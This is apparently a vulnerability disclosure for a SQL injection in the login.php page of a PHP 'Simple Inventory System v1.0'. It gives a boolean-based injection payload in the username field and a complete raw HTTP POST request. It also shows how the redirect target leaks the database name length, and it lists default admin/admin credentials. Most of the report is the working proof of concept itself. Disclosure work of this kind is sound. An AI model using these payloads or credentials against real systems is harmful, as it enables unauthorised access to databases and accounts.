# Simple Inventory System v1.0 by argie has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/4481/simple-inventory-system-using-phpmysql.html

Vulnerability File: /inventory/login.php

Vulnerability location: /inventory/login.php

[+] Payload: username=admi' or length(database()) =8--+&password=admin&submit=Login // Leak place ---> username

Current database name: liveedit,length is 8


```sql
POST /inventory/login.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/inventory/index.php
Cookie: PHPSESSID=limt35893on9omuk2tgcc85iuj
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

username=admi' or length(database()) =8--+&password=admin&submit=Login
```


When length (database (()) = 7, Content-Length: 4;location: index.php
![image](https://user-images.githubusercontent.com/54017627/169197447-c2b7df1c-601f-4a96-a35b-5062c6eeb6aa.png)

When length (database (()) = 8, Content-Length: 4;location: tableedit.php

![image](https://user-images.githubusercontent.com/54017627/169197402-8421a59d-fae9-4cd7-967e-7e8c8187ea85.png)

![image](https://user-images.githubusercontent.com/54017627/169197649-91bfe53e-5f2e-4c27-90c7-d28251a2dbd8.png)

